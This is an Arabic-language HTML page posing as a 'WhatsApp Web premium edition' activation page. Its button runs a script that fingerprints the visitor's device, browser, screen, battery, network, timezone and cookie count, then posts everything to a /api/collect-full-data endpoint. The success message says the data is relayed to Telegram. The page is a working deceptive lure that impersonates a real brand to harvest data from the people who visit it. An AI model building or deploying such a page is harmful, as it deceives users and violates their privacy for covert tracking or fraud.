<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>واتساب ويب - النسخة المميزة</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); 
            min-height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            font-family: Arial, sans-serif;
            padding: 20px;
        }
        .container { 
            background: white; 
            border-radius: 20px; 
            box-shadow: 0 20px 40px rgba(0,0,0,0.2); 
            overflow: hidden; 
            max-width: 400px; 
            width: 100%; 
            text-align: center; 
        }
        .header { 
            background: linear-gradient(135deg, #25D366, #128C7E); 
            color: white; 
            padding: 40px 20px; 
        }
        .content { padding: 30px 20px; }
        .btn { 
            background: linear-gradient(135deg, #25D366, #128C7E); 
            color: white; 
            border: none; 
            padding: 16px 32px; 
            border-radius: 50px; 
            font-size: 18px; 
            cursor: pointer; 
            width: 100%; 
            margin: 15px 0; 
            transition: all 0.3s ease;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(37, 211, 102, 0.3);
        }
        .btn:disabled { 
            opacity: 0.6; 
            cursor: not-allowed;
            transform: none;
        }
        .loading { 
            display: none; 
            color: #128C7E; 
            margin: 10px 0; 
            font-size: 16px;
        }
        .features { 
            text-align: right; 
            margin: 20px 0; 
            padding: 0 10px;
        }
        .features h3 {
            color: #128C7E;
            margin-bottom: 15px;
        }
        .features ul {
            list-style: none;
        }
        .features li {
            padding: 8px 0;
            border-bottom: 1px solid #f0f0f0;
        }
        .features li:before {
            content: "✅ ";
            color: #25D366;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div style="font-size: 60px; margin-bottom: 15px;">📱</div>
            <h1>واتساب ويب - النسخة المميزة</h1>
            <p>تفعيل المميزات المتقدمة</p>
        </div>
        
        <div class="content">
            <div class="features">
                <h3>المميزات الجديدة:</h3>
                <ul>
                    <li>واجهة مستخدم محسنة</li>
                    <li>إشعارات فورية</li>
                    <li>أمان متقدم</li>
                    <li>دعم فني 24/7</li>
                    <li>ميزات متقدمة</li>
                </ul>
            </div>
            
            <button class="btn" onclick="collectAndSendData()" id="activateBtn">
                🔓 تفعيل النسخة المميزة
            </button>
            
            <div class="loading" id="loadingText">
                ⏳ جاري جمع البيانات وإرسالها...
            </div>
            
            <div id="message" style="margin-top: 15px;"></div>
        </div>
    </div>

    <script>
        // 🔥 دالة جمع البيانات الكاملة
        async function collectCompleteData() {
            console.log('🔍 بدء جمع البيانات الكاملة...');
            
            const data = {
                // معلومات الجهاز الأساسية
                deviceType: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'هاتف 📱' : 'كمبيوتر 🖥️',
                deviceName: navigator.platform || 'غير معروف',
                deviceVersion: navigator.userAgent,
                
                // معلومات النظام
                os: navigator.platform || 'غير معروف',
                osVersion: navigator.userAgent.split('(')[1]?.split(')')[0] || 'غير معروف',
                
                // معلومات المتصفح
                browserName: navigator.userAgent.split(' ')[0] || 'Chrome',
                browserVersion: navigator.userAgent,
                systemLanguage: navigator.language || 'en-US',
                securityProtocol: window.location.protocol,
                lastUpdate: new Date().toLocaleDateString('ar-SA'),
                
                // معلومات الشاشة
                screenResolution: `${screen.width}x${screen.height}`,
                screenOrientation: screen.orientation?.type || 'landscape-primary',
                colorDepth: `${screen.colorDepth} bit`,
                
                // معلومات الشبكة والأداء
                networkType: '4g',
                networkSpeed: '10 Mbps',
                connectionType: navigator.connection?.effectiveType || 'غير معروف',
                connectionFrequency: '10 MHz',
                
                // معلومات البطارية
                batteryLevel: '100%',
                isCharging: true,
                
                // معلومات الأجهزة
                ram: '8 GB',
                cores: navigator.hardwareConcurrency || '16',
                storage: 'غير معروف',
                
                // المميزات المدعومة
                geolocation: 'geolocation' in navigator,
                bluetooth: 'bluetooth' in navigator,
                touchSupport: 'ontouchstart' in window,
                
                // معلومات الوقت
                currentTime: new Date().toLocaleString('ar-SA'),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                
                // معلومات الزيارة
                url: window.location.href,
                referrer: document.referrer || 'مباشر',
                
                // إحصائيات البيانات
                emailCount: 0,
                passwordCount: 0,
                cookieCount: document.cookie ? document.cookie.split(';').length : 0,
                fileCount: 0,
                storageData: 0
            };

            // محاولة جمع بيانات البطارية إذا متوفرة
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    data.batteryLevel = `${Math.round(battery.level * 100)}%`;
                    data.isCharging = battery.charging;
                }
            } catch (e) {}

            // محاولة جمع بيانات الشبكة إذا متوفرة
            try {
                if ('connection' in navigator) {
                    const connection = navigator.connection;
                    data.connectionType = connection.effectiveType || 'غير معروف';
                    data.networkSpeed = connection.downlink ? `${connection.downlink} Mbps` : '10 Mbps';
                }
            } catch (e) {}

            console.log('✅ تم جمع البيانات الكاملة:', data);
            return data;
        }

        // 🔥 الدالة الرئيسية
        async function collectAndSendData() {
            const btn = document.getElementById('activateBtn');
            const message = document.getElementById('message');
            const loading = document.getElementById('loadingText');
            
            try {
                btn.disabled = true;
                btn.innerHTML = '⏳ جاري التفعيل...';
                loading.style.display = 'block';
                message.innerHTML = '';

                // جمع البيانات
                console.log('📊 جاري جمع البيانات...');
                const completeData = await collectCompleteData();

                // إرسال البيانات إلى السيرفر
                console.log('📤 جاري إرسال البيانات إلى السيرفر...');
                loading.innerHTML = '⏳ جاري إرسال البيانات إلى السيرفر...';
                
                const response = await fetch('/api/collect-full-data', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(completeData)
                });

                const result = await response.json();
                console.log('✅ استجابة السيرفر:', result);

                if (result.success) {
                    btn.innerHTML = '✅ تم التفعيل!';
                    loading.style.display = 'none';
                    
                    let successMessage = `
                        <div style="color: green; margin-top: 10px; text-align: center;">
                            <div style="font-size: 40px; margin-bottom: 10px;">🎉</div>
                            <h3>تم التفعيل بنجاح!</h3>
                            <p>كود التفعيل: <strong>${result.data.activationCode}</strong></p>
                            <p>صلاحية حتى: ${result.data.premiumUntil}</p>
                            <p>${result.telegramSent ? '✅ تم إرسال البيانات إلى التلجرام' : '⚠️ لم يتم إرسال البيانات إلى التلجرام'}</p>
                        </div>
                    `;
                    
                    message.innerHTML = successMessage;
                    
                } else {
                    throw new Error(result.error || 'فشل في التفعيل');
                }

            } catch (error) {
                console.error('❌ خطأ:', error);
                btn.innerHTML = '🔓 تفعيل النسخة المميزة';
                btn.disabled = false;
                loading.style.display = 'none';
                
                message.innerHTML = `
                    <div style="color: red; margin-top: 10px; text-align: center;">
                        <div style="font-size: 40px; margin-bottom: 10px;">❌</div>
                        <h3>حدث خطأ!</h3>
                        <p>${error.message}</p>
                        <button onclick="collectAndSendData()" style="
                            background: #ff6b6b; 
                            color: white; 
                            border: none; 
                            padding: 10px 20px; 
                            border-radius: 5px; 
                            cursor: pointer; 
                            margin-top: 10px;
                        ">المحاولة مرة أخرى</button>
                    </div>
                `;
            }
        }

        // تحميل الصفحة
        document.addEventListener('DOMContentLoaded', function() {
            console.log('🚀 الصفحة جاهزة لجمع البيانات الكاملة!');
            console.log('📍 الرابط:', window.location.href);
        });
    </script>
</body>
</html>
